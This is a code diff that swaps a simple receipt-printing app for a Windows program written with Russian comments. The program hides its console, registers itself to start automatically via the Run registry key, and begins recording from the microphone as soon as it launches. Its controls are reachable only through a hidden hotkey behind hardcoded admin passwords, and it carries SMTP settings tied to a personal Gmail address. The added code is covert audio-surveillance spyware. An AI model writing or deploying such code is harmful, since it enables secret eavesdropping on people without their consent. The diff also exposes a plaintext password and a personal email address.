@@ -1,310 +1,530 @@
-# receipt_app.py
 import os
-import tempfile
-import datetime
+import sys
+import time
+import threading
+import wave
+import pyaudio
 import tkinter as tk
-from tkinter import ttk, messagebox, simpledialog, filedialog
-from reportlab.lib.pagesizes import mm
-from reportlab.pdfgen import canvas
-from reportlab.lib.units import mm as mm_unit
-from reportlab.lib.pagesizes import landscape
+from tkinter import messagebox, ttk, scrolledtext
+import json
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+import ctypes
+import win32api
+import win32con
+import win32gui
+import keyboard
+import psutil
+from pathlib import Path
+import socket
+import logging
+from datetime import datetime, timedelta
+import subprocess
+import tempfile
+import locale
 
-# ---------- Helper functions ----------
-def mm_to_points(mm_val):
-    return mm_val * mm_unit
+# Конфигурация
+CONFIG_FILE = "recorder_config.json"
+ADMINS_DB = {
+    "adm_Kachin": "YtnAjhc8",
+    "Администратор": "YtnAjhc8"
+}
 
-# ---------- PDF generator ----------
-def generate_receipt_pdf(filename, store_info, customer_info, items, vat_percent=0):
-    # Receipt width: 80 mm (common thermal width). Height is dynamic based on number of lines.
-    width_mm = 80
-    lines = max(10, len(items) + 10)  # baseline lines
-    line_height_mm = 6  # each line height approx
-    header_height_mm = 30
-    footer_height_mm = 30
-    height_mm = header_height_mm + footer_height_mm + len(items) * line_height_mm
-    width_pts = mm_to_points(width_mm)
-    height_pts = mm_to_points(height_mm)
+DEFAULT_CONFIG = {
+    "recordings_path": os.path.join(os.environ['LOCALAPPDATA'], "Recordings"),
+    "admin_emails": ["kachinlexa1@gmail.com"],
+    "admin_users": list(ADMINS_DB.keys()),
+    "hotkeys": {
+        "show_gui": "ctrl+alt+shift+f4",
+        "start_recording": "ctrl+alt+shift+f2",
+        "stop_recording": "ctrl+alt+shift+f3"
+    },
+    "smtp_server": "smtp.gmail.com",
+    "smtp_port": 587,
+    "smtp_username": "kachinlexa1@gmail.com",
+    "smtp_password": "your_app_password",
+    "sample_rate": 44100,
+    "channels": 1,
+    "chunk_size": 1024
+}
 
-    c = canvas.Canvas(filename, pagesize=(width_pts, height_pts))
 
-    x_margin = mm_to_points(4)
-    y = height_pts - mm_to_points(6)
+# Настройка логирования
+def setup_logging():
+    log_dir = os.path.join(os.environ['LOCALAPPDATA'], "AudioRecorder", "Logs")
+    os.makedirs(log_dir, exist_ok=True)
 
-    # Header (store info)
-    c.setFont("Helvetica-Bold", 9)
-    if store_info.get("name"):
-        c.drawCentredString(width_pts/2, y, store_info.get("name"))
-        y -= mm_to_points(4)
-    c.setFont("Helvetica", 7)
-    if store_info.get("warehouse"):
-        c.drawString(x_margin, y, f"Warehouse/Store: {store_info.get('warehouse')}")
-        y -= mm_to_points(3)
-    if store_info.get("sales_person"):
-        c.drawString(x_margin, y, f"Sales person: {store_info.get('sales_person')}")
-        y -= mm_to_points(3)
-    # date and phone on same line
-    nowstr = datetime.datetime.now().strftime("%d-%m-%Y %H:%M")
-    c.drawString(x_margin, y, f"Phone: {store_info.get('phone','')}")
-    c.drawRightString(width_pts - x_margin, y, f"Date: {nowstr}")
-    y -= mm_to_points(4)
+    # Определяем кодировку системы
+    system_encoding = locale.getpreferredencoding()
 
-    # Order code / items count
-    items_count = sum([it['qty'] for it in items])
-    c.drawString(x_margin, y, f"Items count: {items_count}")
-    c.drawRightString(width_pts - x_margin, y, f"Order code: {store_info.get('order_code','')}")
-    y -= mm_to_points(5)
+    logging.basicConfig(
+        level=logging.DEBUG,
+        format='%(asctime)s - %(levelname)s - %(message)s',
+        handlers=[
+            logging.FileHandler(os.path.join(log_dir, f"audiorecorder_{datetime.now().strftime('%Y%m%d')}.log"),
+                                encoding=system_encoding),
+            logging.StreamHandler()
+        ]
+    )
 
-    # Customer info
-    c.setFont("Helvetica-Bold", 8)
-    c.drawString(x_margin, y, f"Customer: {customer_info.get('name','')}")
-    y -= mm_to_points(3)
-    c.setFont("Helvetica", 7)
-    if customer_info.get('address'):
-        c.drawString(x_margin, y, f"Address: {customer_info.get('address')}")
-        y -= mm_to_points(3)
-    if customer_info.get('phone'):
-        c.drawString(x_margin, y, f"Phone: {customer_info.get('phone')}")
-        y -= mm_to_points(4)
 
-    # Table header
-    c.setFont("Helvetica-Bold", 7)
-    c.drawString(x_margin, y, "Description")
-    c.drawRightString(width_pts - x_margin - mm_to_points(2+10), y, "Code")
-    c.drawRightString(width_pts - x_margin - mm_to_points(2), y, "Qty")
-    c.drawRightString(width_pts - x_margin - mm_to_points(20), y, "Price")
-    c.drawRightString(width_pts - x_margin, y, "Total")
-    y -= mm_to_points(4)
+setup_logging()
 
-    c.setFont("Helvetica", 7)
-    line_pad = mm_to_points(4)
-    total_sum = 0
-    for it in items:
-        desc = it['desc']
-        code = it['code']
-        qty = it['qty']
-        price = it['price']
-        line_total = qty * price
-        total_sum += line_total
 
-        # Description (wrap if too long)
-        c.drawString(x_margin, y, desc[:30])
-        c.drawRightString(width_pts - x_margin - mm_to_points(2+10), y, str(code))
-        c.drawRightString(width_pts - x_margin - mm_to_points(2), y, f"{qty}")
-        c.drawRightString(width_pts - x_margin - mm_to_points(20), y, f"{price:,.0f}")
-        c.drawRightString(width_pts - x_margin, y, f"{line_total:,.0f}")
-        y -= mm_to_points(4)
+class AudioRecorder:
+    def __init__(self):
+        self.recording = False
+        self.frames = []
+        self.audio = None
+        self.stream = None
+        self.current_file = None
+        self.recording_start_time = None
+        self.load_config()
+        self.setup_directories()
+        logging.info("AudioRecorder инициализирован")
 
-    # Totals
-    y -= mm_to_points(2)
-    c.setFont("Helvetica-Bold", 8)
-    c.drawRightString(width_pts - x_margin, y, f"Subtotal: {total_sum:,.0f}")
-    y -= mm_to_points(4)
-    vat_amount = total_sum * (vat_percent/100.0)
-    c.setFont("Helvetica", 8)
-    c.drawRightString(width_pts - x_margin, y, f"VAT ({vat_percent}%): {vat_amount:,.0f}")
-    y -= mm_to_points(4)
-    net = total_sum + vat_amount
-    c.setFont("Helvetica-Bold", 9)
-    c.drawRightString(width_pts - x_margin, y, f"Amount due: {net:,.0f}")
-    y -= mm_to_points(6)
+        # Проверяем доступные устройства
+        self.list_audio_devices()
 
-    # Footer
-    c.setFont("Helvetica", 7)
-    c.drawCentredString(width_pts/2, y, store_info.get('footer_note','Thank you'))
-    # finish
-    c.showPage()
-    c.save()
-
-# ---------- GUI ----------
-class ReceiptApp:
-    def __init__(self, master):
-        self.master = master
-        master.title("Simple Receipt Printer")
-        master.geometry("800x600")
-
-        # store info (editable)
-        self.store_info = {
-            "name": "Sales order",
-            "warehouse": "المؤسسة العامة",
-            "sales_person": "اسم البائع",
-            "phone": "23961143",
-            "order_code": "SO-#83",
-            "footer_note": ""
-        }
-
-        self.items = []
-
-        # Top frame: store and customer
-        top = tk.Frame(master)
-        top.pack(fill="x", padx=8, pady=6)
-
-        # Store editable fields
-        store_frame = tk.LabelFrame(top, text="Store info (editable)")
-        store_frame.pack(side="left", padx=6)
-        tk.Label(store_frame, text="Name").grid(row=0,column=0)
-        self.ent_store_name = tk.Entry(store_frame, width=30)
-        self.ent_store_name.insert(0, self.store_info["name"])
-        self.ent_store_name.grid(row=0,column=1)
-        tk.Label(store_frame, text="Phone").grid(row=1,column=0)
-        self.ent_store_phone = tk.Entry(store_frame, width=30)
-        self.ent_store_phone.insert(0, self.store_info["phone"])
-        self.ent_store_phone.grid(row=1,column=1)
-        tk.Label(store_frame, text="Order code").grid(row=2,column=0)
-        self.ent_order_code = tk.Entry(store_frame, width=30)
-        self.ent_order_code.insert(0, self.store_info["order_code"])
-        self.ent_order_code.grid(row=2,column=1)
-
-        # Customer frame
-        cust_frame = tk.LabelFrame(top, text="Customer")
-        cust_frame.pack(side="left", padx=6)
-        tk.Label(cust_frame, text="Name").grid(row=0,column=0)
-        self.ent_cust_name = tk.Entry(cust_frame, width=30)
-        self.ent_cust_name.grid(row=0,column=1)
-        tk.Label(cust_frame, text="Phone").grid(row=1,column=0)
-        self.ent_cust_phone = tk.Entry(cust_frame, width=30)
-        self.ent_cust_phone.grid(row=1,column=1)
-        tk.Label(cust_frame, text="Address").grid(row=2,column=0)
-        self.ent_cust_addr = tk.Entry(cust_frame, width=30)
-        self.ent_cust_addr.grid(row=2,column=1)
-
-        # Items table
-        tbl_frame = tk.LabelFrame(master, text="Items")
-        tbl_frame.pack(fill="both", expand=True, padx=8, pady=6)
-        cols = ("desc","code","qty","price","total")
-        self.tree = ttk.Treeview(tbl_frame, columns=cols, show="headings")
-        self.tree.heading("desc", text="Description")
-        self.tree.heading("code", text="Code")
-        self.tree.heading("qty", text="Qty")
-        self.tree.heading("price", text="Price")
-        self.tree.heading("total", text="Line total")
-        self.tree.pack(fill="both", expand=True, side="left")
-        vsb = ttk.Scrollbar(tbl_frame, orient="vertical", command=self.tree.yview)
-        self.tree.configure(yscroll=vsb.set)
-        vsb.pack(side="left", fill="y")
-
-        # Buttons for items
-        btns = tk.Frame(master)
-        btns.pack(fill="x", padx=8, pady=6)
-        tk.Button(btns, text="Add item", command=self.add_item_dialog).pack(side="left", padx=4)
-        tk.Button(btns, text="Remove selected", command=self.remove_selected).pack(side="left", padx=4)
-        tk.Button(btns, text="Clear all", command=self.clear_all).pack(side="left", padx=4)
-
-        # Bottom: totals and print
-        bottom = tk.Frame(master)
-        bottom.pack(fill="x", padx=8, pady=6)
-        tk.Label(bottom, text="VAT %").pack(side="left")
-        self.vat_var = tk.DoubleVar(value=0.0)
-        tk.Entry(bottom, textvariable=self.vat_var, width=6).pack(side="left", padx=4)
-        tk.Button(bottom, text="Generate PDF", command=self.generate_pdf).pack(side="right", padx=4)
-        tk.Button(bottom, text="Generate and Print", command=self.generate_and_print).pack(side="right", padx=4)
-
-    def add_item_dialog(self):
-        d = simpledialog.Dialog(self.master, title="Add item")
-        # We'll make a tiny custom dialog instead
-        dialog = tk.Toplevel(self.master)
-        dialog.title("Add item")
-        tk.Label(dialog, text="Description").grid(row=0,column=0)
-        e_desc = tk.Entry(dialog, width=30); e_desc.grid(row=0,column=1)
-        tk.Label(dialog, text="Code").grid(row=1,column=0)
-        e_code = tk.Entry(dialog, width=20); e_code.grid(row=1,column=1)
-        tk.Label(dialog, text="Qty").grid(row=2,column=0)
-        e_qty = tk.Entry(dialog, width=10); e_qty.insert(0,"1"); e_qty.grid(row=2,column=1)
-        tk.Label(dialog, text="Price").grid(row=3,column=0)
-        e_price = tk.Entry(dialog, width=15); e_price.insert(0,"0"); e_price.grid(row=3,column=1)
-
-        def on_ok():
-            try:
-                desc = e_desc.get()
-                code = e_code.get()
-                qty = float(e_qty.get())
-                price = float(e_price.get())
-            except Exception as ex:
-                messagebox.showerror("Error", "Invalid quantity or price")
-                return
-            line_total = qty * price
-            item = {'desc': desc, 'code': code, 'qty': qty, 'price': price}
-            self.items.append(item)
-            self.tree.insert("", "end", values=(desc, code, qty, f"{price:,.0f}", f"{line_total:,.0f}"))
-            dialog.destroy()
-
-        tk.Button(dialog, text="OK", command=on_ok).grid(row=4,column=0)
-        tk.Button(dialog, text="Cancel", command=dialog.destroy).grid(row=4,column=1)
-        dialog.transient(self.master)
-        dialog.grab_set()
-        self.master.wait_window(dialog)
-
-    def remove_selected(self):
-        sel = self.tree.selection()
-        if not sel:
-            return
-        idxs = [self.tree.index(s) for s in sel]
-        for s in sel:
-            self.tree.delete(s)
-        # remove from items list by indices (reverse order)
-        for i in sorted(idxs, reverse=True):
-            if i < len(self.items):
-                del self.items[i]
-
-    def clear_all(self):
-        self.tree.delete(*self.tree.get_children())
-        self.items = []
-
-    def generate_pdf(self):
-        # collect store info
-        self.store_info['name'] = self.ent_store_name.get()
-        self.store_info['phone'] = self.ent_store_phone.get()
-        self.store_info['order_code'] = self.ent_order_code.get()
-        customer_info = {
-            'name': self.ent_cust_name.get(),
-            'phone': self.ent_cust_phone.get(),
-            'address': self.ent_cust_addr.get()
-        }
-        if not self.items:
-            messagebox.showwarning("No items", "Add items before generating receipt.")
-            return
-        path = filedialog.asksaveasfilename(defaultextension=".pdf", filetypes=[("PDF files","*.pdf")], title="Save receipt as")
-        if not path:
-            return
+    def list_audio_devices(self):
+        """Выводит список доступных аудиоустройств"""
         try:
-            generate_receipt_pdf(path, self.store_info, customer_info, self.items, vat_percent=self.vat_var.get())
-            messagebox.showinfo("Done", f"PDF generated: {path}")
-            return path
+            audio = pyaudio.PyAudio()
+            logging.info("Доступные аудиоустройства:")
+            for i in range(audio.get_device_count()):
+                device_info = audio.get_device_info_by_index(i)
+                if device_info['maxInputChannels'] > 0:
+                    logging.info(f"Устройство {i}: {device_info['name']} (каналов: {device_info['maxInputChannels']})")
+            audio.terminate()
         except Exception as e:
-            messagebox.showerror("Error", str(e))
-            return None
+            logging.error(f"Ошибка при получении списка устройств: {e}")
 
-    def generate_and_print(self):
-        # generate in temp then print
-        self.store_info['name'] = self.ent_store_name.get()
-        self.store_info['phone'] = self.ent_store_phone.get()
-        self.store_info['order_code'] = self.ent_order_code.get()
-        customer_info = {
-            'name': self.ent_cust_name.get(),
-            'phone': self.ent_cust_phone.get(),
-            'address': self.ent_cust_addr.get()
-        }
-        if not self.items:
-            messagebox.showwarning("No items", "Add items before generating receipt.")
-            return
-        tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".pdf")
-        tmp.close()
+    def load_config(self):
         try:
-            generate_receipt_pdf(tmp.name, self.store_info, customer_info, self.items, vat_percent=self.vat_var.get())
-        except Exception as e:
-            messagebox.showerror("Error generating PDF", str(e))
-            return
-        # Try to print using default program on Windows
-        try:
-            if os.name == 'nt':
-                # This sends the file to default printer (uses registered application for .pdf)
-                os.startfile(tmp.name, "print")
-                messagebox.showinfo("Printed", "تم إرسال الفاتورة للطابعة (الافتراضية).")
+            config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), CONFIG_FILE)
+            if os.path.exists(config_path):
+                with open(config_path, 'r', encoding='utf-8') as f:
+                    self.config = json.load(f)
             else:
-                messagebox.showinfo("PDF Created", f"PDF created at: {tmp.name}")
+                self.config = DEFAULT_CONFIG
+                with open(config_path, 'w', encoding='utf-8') as f:
+                    json.dump(self.config, f, indent=4, ensure_ascii=False)
+            logging.info("Конфигурация загружена")
         except Exception as e:
-            messagebox.showerror("Print error", f"Could not print automatically. PDF saved at: {tmp.name}\n\nError: {e}")
+            self.config = DEFAULT_CONFIG
+            logging.error(f"Ошибка загрузки конфигурации: {str(e)}")
+
+    def setup_directories(self):
+        try:
+            # Автоматически определяем путь для текущего пользователя
+            recordings_path = os.path.join(os.environ['LOCALAPPDATA'], "Recordings")
+            self.config['recordings_path'] = recordings_path
+            os.makedirs(recordings_path, exist_ok=True)
+            logging.info(f"Директория записей: {recordings_path}")
+        except Exception as e:
+            logging.error(f"Ошибка создания директории: {str(e)}")
+
+    def start_recording(self):
+        logging.debug("Попытка начать запись...")
+
+        if self.recording:
+            logging.info("Запись уже запущена")
+            return True
+
+        try:
+            self.audio = pyaudio.PyAudio()
+
+            # Используем устройство по умолчанию
+            device_index = None
+            for i in range(self.audio.get_device_count()):
+                device_info = self.audio.get_device_info_by_index(i)
+                if device_info['maxInputChannels'] > 0:
+                    device_index = i
+                    logging.info(f"Используем устройство: {device_info['name']}")
+                    break
+
+            if device_index is None:
+                raise Exception("Микрофон не найден")
+
+            self.stream = self.audio.open(
+                format=pyaudio.paInt16,
+                channels=self.config['channels'],
+                rate=self.config['sample_rate'],
+                input=True,
+                frames_per_buffer=self.config['chunk_size'],
+                input_device_index=device_index
+            )
+
+            self.recording = True
+            self.frames = []
+            self.recording_start_time = time.time()
+
+            # Создаем файл для записи
+            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+            self.current_file = os.path.join(self.config['recordings_path'], f"recording_{timestamp}.wav")
+
+            # Запускаем поток записи
+            self.recording_thread = threading.Thread(target=self.record_loop)
+            self.recording_thread.daemon = True
+            self.recording_thread.start()
+
+            logging.info(f"Запись начата. Файл: {self.current_file}")
+            return True
+
+        except Exception as e:
+            logging.error(f"Ошибка начала записи: {str(e)}")
+            if self.audio:
+                self.audio.terminate()
+            return False
+
+    def stop_recording(self):
+        logging.debug("Попытка остановить запись...")
+
+        if not self.recording:
+            logging.debug("Запись не активна")
+            return
+
+        self.recording = False
+
+        if hasattr(self, 'recording_thread') and self.recording_thread.is_alive():
+            self.recording_thread.join(timeout=2.0)
+
+        if self.stream:
+            try:
+                self.stream.stop_stream()
+                self.stream.close()
+            except Exception as e:
+                logging.error(f"Ошибка закрытия stream: {e}")
+
+        if self.audio:
+            try:
+                self.audio.terminate()
+            except Exception as e:
+                logging.error(f"Ошибка завершения audio: {e}")
+
+        # Сохраняем записанные данные
+        if self.frames:
+            try:
+                with wave.open(self.current_file, 'wb') as wf:
+                    wf.setnchannels(self.config['channels'])
+                    wf.setsampwidth(2)  # 16-bit audio
+                    wf.setframerate(self.config['sample_rate'])
+                    wf.writeframes(b''.join(self.frames))
+                logging.info(f"Запись сохранена: {self.current_file}")
+
+                # Проверяем размер файла
+                file_size = os.path.getsize(self.current_file)
+                logging.info(f"Размер файла: {file_size} байт")
+
+            except Exception as e:
+                logging.error(f"Ошибка сохранения записи: {str(e)}")
+        else:
+            logging.warning("Нет данных для сохранения")
+
+    def record_loop(self):
+        logging.debug("Запуск цикла записи")
+        while self.recording:
+            try:
+                data = self.stream.read(self.config['chunk_size'], exception_on_overflow=False)
+                self.frames.append(data)
+            except Exception as e:
+                logging.error(f"Ошибка во время записи: {str(e)}")
+                self.recording = False
+                break
+
+    def toggle_recording(self):
+        if self.recording:
+            self.stop_recording()
+        else:
+            self.start_recording()
+
+
+class AdminAuth:
+    @staticmethod
+    def authenticate():
+        """Аутентификация администратора"""
+        root = tk.Tk()
+        root.title("Аутентификация администратора")
+        root.geometry("300x150")
+        root.resizable(False, False)
+        root.eval('tk::PlaceWindow . center')
+
+        result = [False]
+
+        def check_auth():
+            username = username_entry.get().strip()
+            password = password_entry.get()
+
+            if username in ADMINS_DB and ADMINS_DB[username] == password:
+                result[0] = True
+                root.quit()
+            else:
+                messagebox.showerror("Ошибка", "Неверные учетные данные")
+
+        ttk.Label(root, text="Логин:").pack(pady=5)
+        username_entry = ttk.Entry(root, width=30)
+        username_entry.pack(pady=5)
+
+        ttk.Label(root, text="Пароль:").pack(pady=5)
+        password_entry = ttk.Entry(root, width=30, show="*")
+        password_entry.pack(pady=5)
+
+        ttk.Button(root, text="Войти", command=check_auth).pack(pady=10)
+
+        root.mainloop()
+        root.destroy()
+
+        return result[0]
+
+
+class RecorderApp:
+    def __init__(self):
+        self.recorder = AudioRecorder()
+        self.setup_hotkeys()
+
+        # Для GUI
+        self.root = None
+        self.gui_thread = None
+
+        # Автозапуск
+        self.setup_autostart()
+
+        # Запуск записи по умолчанию
+        self.recorder.start_recording()
+
+    def setup_autostart(self):
+        try:
+            # Добавляем в автозагрузку через реестр
+            app_path = os.path.abspath(sys.argv[0])
+
+            key = win32api.RegOpenKeyEx(
+                win32con.HKEY_CURRENT_USER,
+                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                0, win32con.KEY_SET_VALUE
+            )
+            win32api.RegSetValueEx(key, "AudioRecorder", 0, win32con.REG_SZ, f'"{app_path}"')
+            win32api.RegCloseKey(key)
+
+            logging.info("Программа добавлена в автозагрузку")
+        except Exception as e:
+            logging.error(f"Ошибка настройки автозапуска: {str(e)}")
+
+    def setup_hotkeys(self):
+        try:
+            # Горячие клавиши для показа GUI
+            keyboard.add_hotkey(
+                self.recorder.config['hotkeys']['show_gui'],
+                self.show_gui
+            )
+
+            # Горячие клавиши для записи
+            keyboard.add_hotkey(
+                self.recorder.config['hotkeys']['start_recording'],
+                self.recorder.start_recording
+            )
+
+            keyboard.add_hotkey(
+                self.recorder.config['hotkeys']['stop_recording'],
+                self.recorder.stop_recording
+            )
+
+            logging.info("Горячие клавиши настроены")
+        except Exception as e:
+            logging.error(f"Ошибка настройки горячих клавиш: {str(e)}")
+
+    def show_gui(self):
+        if not AdminAuth.authenticate():
+            return
+
+        if self.root is not None:
+            try:
+                self.root.deiconify()
+                self.root.lift()
+                self.root.focus_force()
+                return
+            except:
+                self.root = None
+
+        self.gui_thread = threading.Thread(target=self._create_gui)
+        self.gui_thread.daemon = True
+        self.gui_thread.start()
+
+    def _create_gui(self):
+        """Создает GUI интерфейс"""
+        self.root = tk.Tk()
+        self.root.title("Audio Recorder - Режим разработчика")
+        self.root.geometry("800x600")
+        self.root.protocol("WM_DELETE_WINDOW", self.hide_gui)
+        self.root.eval('tk::PlaceWindow . center')
+
+        notebook = ttk.Notebook(self.root)
+        notebook.pack(fill='both', expand=True, padx=10, pady=10)
+
+        control_frame = ttk.Frame(notebook, padding="10")
+        notebook.add(control_frame, text="Управление")
+
+        diag_frame = ttk.Frame(notebook, padding="10")
+        notebook.add(diag_frame, text="Диагностика")
+
+        self.setup_control_tab(control_frame)
+        self.setup_diag_tab(diag_frame)
+
+        self.update_status()
+        self.root.mainloop()
+
+    def setup_control_tab(self, frame):
+        self.record_btn = ttk.Button(
+            frame,
+            text="Остановить запись" if self.recorder.recording else "Начать запись",
+            command=self.toggle_recording,
+            width=20
+        )
+        self.record_btn.grid(row=0, column=0, pady=10, padx=5)
+
+        self.status_label = ttk.Label(
+            frame,
+            text="Статус: " + ("Запись..." if self.recorder.recording else "Не записывается"),
+            font=("Arial", 12)
+        )
+        self.status_label.grid(row=0, column=1, pady=10, padx=5)
+
+        self.file_label = ttk.Label(
+            frame,
+            text=f"Текущий файл: {os.path.basename(self.recorder.current_file) if self.recorder.current_file else 'Нет'}",
+            wraplength=400
+        )
+        self.file_label.grid(row=1, column=0, columnspan=2, pady=5)
+
+        ttk.Button(
+            frame,
+            text="Тест записи (5 сек)",
+            command=self.test_recording,
+            width=20
+        ).grid(row=2, column=0, pady=10, padx=5)
+
+        ttk.Button(
+            frame,
+            text="Открыть папку записей",
+            command=self.open_recordings_folder,
+            width=20
+        ).grid(row=2, column=1, pady=10, padx=5)
+
+        ttk.Button(
+            frame,
+            text="Скрыть окно",
+            command=self.hide_gui,
+            width=20
+        ).grid(row=3, column=0, pady=10, padx=5)
+
+        ttk.Button(
+            frame,
+            text="Остановить программу",
+            command=self.stop_program,
+            width=20
+        ).grid(row=3, column=1, pady=10, padx=5)
+
+    def setup_diag_tab(self, frame):
+        diag_text = scrolledtext.ScrolledText(frame, width=90, height=25)
+        diag_text.pack(fill='both', expand=True, pady=5)
+
+        info = self.get_diagnostic_info()
+        diag_text.insert(tk.END, info)
+
+        ttk.Button(frame, text="Обновить диагностику",
+                   command=lambda: self.update_diagnostic_info(diag_text)).pack(pady=5)
+
+    def get_diagnostic_info(self):
+        info = "=" * 50 + "\n"
+        info += "ДИАГНОСТИЧЕСКАЯ ИНФОРМАЦИЯ\n"
+        info += "=" * 50 + "\n\n"
+
+        info += f"Пользователь: {os.environ.get('USERNAME', 'Unknown')}\n"
+        info += f"Компьютер: {os.environ.get('COMPUTERNAME', 'Unknown')}\n"
+        info += f"Python: {sys.version}\n\n"
+
+        info += f"Статус записи: {'Активна' if self.recorder.recording else 'Не активна'}\n"
+        info += f"Количество фреймов: {len(self.recorder.frames)}\n"
+
+        info += f"Папка записей: {self.recorder.config['recordings_path']}\n"
+        info += f"Папка существует: {os.path.exists(self.recorder.config['recordings_path'])}\n\n"
+
+        if os.path.exists(self.recorder.config['recordings_path']):
+            files = [f for f in os.listdir(self.recorder.config['recordings_path']) if f.endswith('.wav')]
+            info += f"Найдено файлов: {len(files)}\n"
+            for file in files[:5]:
+                info += f"  - {file}\n"
+
+        return info
+
+    def update_diagnostic_info(self, text_widget):
+        info = self.get_diagnostic_info()
+        text_widget.delete(1.0, tk.END)
+        text_widget.insert(1.0, info)
+
+    def test_recording(self):
+        if not self.recorder.recording:
+            if self.recorder.start_recording():
+                self.root.after(5000, self.recorder.stop_recording)
+                messagebox.showinfo("Тест", "Запись начата на 5 секунд")
+            else:
+                messagebox.showerror("Ошибка", "Не удалось начать запись")
+        else:
+            messagebox.showinfo("Информация", "Запись уже активна")
+
+    def open_recordings_folder(self):
+        try:
+            os.startfile(self.recorder.config['recordings_path'])
+        except Exception as e:
+            messagebox.showerror("Ошибка", f"Не удалось открыть папку: {str(e)}")
+
+    def hide_gui(self):
+        if self.root:
+            self.root.withdraw()
+
+    def toggle_recording(self):
+        if self.recorder.recording:
+            self.recorder.stop_recording()
+        else:
+            self.recorder.start_recording()
+
+        if self.root:
+            self.record_btn.config(
+                text="Остановить запись" if self.recorder.recording else "Начать запись"
+            )
+            self.update_status()
+
+    def stop_program(self):
+        if messagebox.askyesno("Подтверждение", "Вы уверены, что хотите остановить программу?"):
+            self.recorder.stop_recording()
+            if self.root:
+                self.root.quit()
+            logging.info("Программа остановлена пользователем")
+            os._exit(0)
+
+    def update_status(self):
+        if self.root and tk._default_root:
+            self.status_label.config(
+                text="Статус: " + ("Запись..." if self.recorder.recording else "Не записывается")
+            )
+            if self.recorder.current_file:
+                self.file_label.config(
+                    text=f"Текущий файл: {os.path.basename(self.recorder.current_file)}"
+                )
+            self.root.after(1000, self.update_status)
+
+
+def main():
+    if hasattr(ctypes, 'windll'):
+        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+
+    app = RecorderApp()
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        pass
+
 
 if __name__ == "__main__":
-    root = tk.Tk()
-    app = ReceiptApp(root)
-    root.mainloop()
+    main()
